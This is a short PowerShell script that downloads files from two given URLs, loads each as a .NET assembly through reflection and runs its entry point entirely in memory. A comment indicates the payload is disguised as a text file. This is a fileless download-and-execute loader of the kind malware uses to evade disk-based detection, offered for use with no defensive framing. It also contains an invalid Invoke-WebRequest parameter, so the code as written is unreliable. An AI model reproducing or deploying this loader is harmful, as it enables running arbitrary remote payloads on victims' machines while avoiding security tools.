param(
    [string]$url1,
    [string]$url2
)

# Function to run an EXE from memory
function Run-ExeFromMemory {
    param([string]$url)

    # Download the EXE as a byte array (since it's a text file that should be renamed to EXE)
    $exeBytes = Invoke-WebRequest -Uri $url -UseBasicPipelining | Select-Object -ExpandProperty Content

    # Load the byte array into a memory stream
    $memoryStream = New-Object System.IO.MemoryStream
    $memoryStream.Write($exeBytes, 0, $exeBytes.Length)
    $memoryStream.Seek(0, [System.IO.SeekOrigin]::Begin)  # Reset position to beginning of stream

    # Load the EXE into memory using Reflection
    $assembly = [System.Reflection.Assembly]::Load($memoryStream.ToArray())

    # Create and run the EXE (it assumes the EXE has a valid entry point)
    $entryPoint = $assembly.EntryPoint
    if ($entryPoint) {
        $entryPoint.Invoke($null, @())
    } else {
        Write-Host 'No entry point found in EXE'
    }
}

# Run the EXEs in memory by calling the function with URLs
Run-ExeFromMemory -url $url1
Run-ExeFromMemory -url $url2
